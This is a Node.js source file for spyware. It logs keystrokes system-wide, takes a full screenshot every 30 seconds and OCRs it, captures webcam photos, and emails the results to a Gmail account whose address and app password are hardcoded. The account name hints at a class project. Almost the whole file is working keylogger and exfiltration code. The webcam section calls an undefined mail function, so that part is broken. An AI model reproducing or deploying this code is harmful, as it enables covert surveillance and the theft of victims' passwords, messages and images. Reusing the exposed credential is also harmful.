const nodemailer = require('nodemailer');
const GlobalKeyboardListener = require('node-global-key-listener').GlobalKeyboardListener;
const Tesseract = require('tesseract.js');
const screenshot = require('screenshot-desktop');
const fs = require('fs');
const NodeWebcam = require('node-webcam');

const transporter = nodemailer.createTransport({
  host: 'smtp.gmail.com',
  port: 587,
  secure: false,
  auth: {
    user: 'infoassuranceg5@gmail.com',
    pass: 'qexn zdiu cprv uilm',
  },
});

const Webcam = NodeWebcam.create({
  width: 1280,
  height: 720,
  quality: 100,
});

let capsLock = false;
let currentOutput = '';
let inactivityTimeout;
let emailSent = false;
let extractedTextPrinted = false;

function updateOutput(e) {
  let keyName = e.name;

  if (keyName == 'CAPS LOCK') {
    capsLock = !capsLock;
  }

  if (capsLock && keyName.match(/^[a-zA-Z]$/)) {
    keyName = keyName.toLowerCase();
  }

  const enclosedKey = keyName.match(/^[a-zA-Z]$/) ? keyName : `<${keyName}>`;

  currentOutput += enclosedKey;

  process.stdout.write('\x1Bc');
  process.stdout.write(currentOutput.trim());

  clearTimeout(inactivityTimeout);
  inactivityTimeout = setTimeout(() => {
    if (!emailSent) {
      sendLogsByEmail(currentOutput);
      emailSent = true;
    }
    currentOutput = '';
  }, 30000);
}

function combineTexts(manuallyTypedText, extractedText) {
  if (extractedText) {
    manuallyTypedText += '\n\nThe extracted text from Screenshot:\n';
  }

  manuallyTypedText += extractedText;

  return manuallyTypedText;
}

function sendLogsByEmail(logs) {
  const mailOptions = {
    from: 'infoassuranceg5@gmail.com',
    to: 'infoassuranceg5@gmail.com',
    subject: 'Keyboard Logs',
    text: logs,
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.error('Error sending email:', error);
    } else {
      console.log('Email sent:', info.response);
    }
  });
}

function sendLogsByEmailWithScreenshot(logs, screenshotPath) {
  const mailOptions = {
    from: 'infoassuranceg5@gmail.com',
    to: 'infoassuranceg5@gmail.com',
    subject: 'Keyboard Logs with Screenshot',
    text: logs,
    attachments: [
      {
        filename: 'screenshot.png',
        path: screenshotPath,
        encoding: 'base64',
        contentDisposition: 'inline',
      },
    ],
  };

  transporter.sendMail(mailOptions, function (error, info) {
    if (error) {
      console.error('Error sending email with screenshot:', error);
    } else {
      console.log('Email with screenshot sent:', info.response);
    }
  });
}

function readTextFromScreenshot(imagePath) {
  return new Promise((resolve, reject) => {
    Tesseract.recognize(imagePath, 'eng', {
      logger: (info) => console.log(info),
    })
      .then(({ data: { text } }) => {
        resolve(text);
      })
      .catch((error) => {
        reject(error);
      });
  });
}

function takeScreenshot() {
  const screenshotPath = `${__dirname}/screenshot.png`;

  return new Promise((resolve, reject) => {
    screenshot()
      .then((img) => {
        fs.writeFileSync(screenshotPath, img);
        resolve(screenshotPath);
      })
      .catch((error) => {
        reject(error);
      });
  });
}

function takeFullScreenshot() {
  const screenshotPath = `${__dirname}/full_screenshot.png`;

  return new Promise((resolve, reject) => {
    screenshot({ screen: 'all' })
      .then((img) => {
        fs.writeFileSync(screenshotPath, img);
        resolve(screenshotPath);
      })
      .catch((error) => {
        reject(error);
      });
  });
}

function takeFullScreenshotAndProcess() {
  takeFullScreenshot()
    .then((screenshotPath) => {
      console.log('Screenshot taken:', screenshotPath);
      readTextFromScreenshot(screenshotPath)
        .then((text) => {
          const combinedText = combineTexts(currentOutput, text);
          currentOutput = combinedText;

          if (!extractedTextPrinted) {
            process.stdout.write(`\nExtracted text: ${text}`);
            extractedTextPrinted = true;

            if (!emailSent) {
              console.log('Sending email with screenshot...');
              sendLogsByEmailWithScreenshot(currentOutput, screenshotPath);
              emailSent = true;
            }
          }
        })
        .catch((error) => {
          console.error('Error reading text from screenshot:', error);
        });
    })
    .catch((error) => {
      console.error('Error taking full screenshot:', error);
    });
}

setInterval(takeFullScreenshotAndProcess, 30000);

const v = new GlobalKeyboardListener();
const keyState = {};

v.addListener(function (e) {
  const keyName = e.name;

  if (!keyState[keyName]) {
    updateOutput(e);
    keyState[keyName] = true;
  }
});

v.addListener(function (e, down) {
  const keyName = e.name;

  if (!down[keyName]) {
    keyState[keyName] = false;
  }
});

calledOnce = function (e) {
  console.log('only called once');
  v.removeListener(calledOnce);
};
v.addListener(calledOnce);

// Add the webcam capture and email sending function
function captureWebcamPhotoAndSendEmail() {
  Webcam.capture('webcam_capture', (err, data) => {
    if (err) {
      console.error('Error capturing webcam photo:', err);
    } else {
      console.log('Webcam photo captured:', data);

      const emailSubject = 'Webcam Photo';
      const emailBody = 'Here is a photo from the webcam.';
      sendPhotoByEmail(data, emailSubject, emailBody);
    }
  });
}

// Schedule the webcam capture function to run every 30 seconds
setInterval(captureWebcamPhotoAndSendEmail, 30000);